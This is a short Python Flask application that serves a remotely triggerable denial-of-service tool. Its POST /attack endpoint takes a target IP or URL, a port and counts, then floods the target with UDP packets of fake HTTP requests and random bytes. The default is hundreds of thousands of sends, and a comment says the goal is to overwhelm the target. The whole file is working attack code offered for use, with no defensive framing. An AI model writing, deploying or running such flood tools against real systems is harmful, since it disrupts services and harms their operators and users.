from flask import Flask, jsonify, request
import socket
import random
import os
import re

app = Flask(__name__)

@app.route('/attack', methods=['POST'])
def start_attack():
    data = request.get_json()
    num_bytes = data.get('payload', 1024)
    num_attacks = data.get('attack_num', 100000)
    target_ip = data.get('ip', "0.0.0.0")
    target_port = data.get('port', 80)

# Function to check if a string is a valid IP address
    def is_valid_ip(ip):
        parts = ip.split('.')
        if len(parts) != 4:
            return False
        for part in parts:
            if not part.isdigit() or not 0 <= int(part) <= 255:
                return False
        return True

# If target_ip is not a valid IP address, try to resolve it as a URL
    if not is_valid_ip(target_ip):
    # Remove protocol prefix if present
        target_url = re.sub(r'^(http|https|ftp|udp)://', '', target_ip)
        target_ip = socket.gethostbyname(target_url)
    
    #data = request.get_json()
    #num_bytes = data.get('payload', 1024)
    #num_attacks = data.get('attack_num', 100000)
    #target_ip = data.get('ip', "0.0.0.0")
    #target_port = data.get('port', 80)

    def attack():
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        fake_ip = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
        payload = f"GET / HTTP/1.1\r\nHost: {fake_ip}\r\n\r\n"
        s.sendto(payload.encode(), (target_ip, int(target_port)))
    # Send a large number of random bytes multiple times to overwhelm the target
        for _ in range(int(num_bytes) // 1024):  # Send in chunks of 1KB
            s.sendto(os.urandom(int(num_bytes)), (target_ip, int(target_port)))
        remaining_bytes = int(num_bytes) % 1024
        if remaining_bytes > 0:
            s.sendto(random._urandom(remaining_bytes), (target_ip, int(target_port)))
        s.close()
        
    for _ in range(int(data.get('threads', 10))):
        for _ in range(int(num_attacks)):
            attack()

    return jsonify({'success': True, 'message': 'Attack finished successfully.'})

if __name__ == '__main__':
    app.run(debug=True)
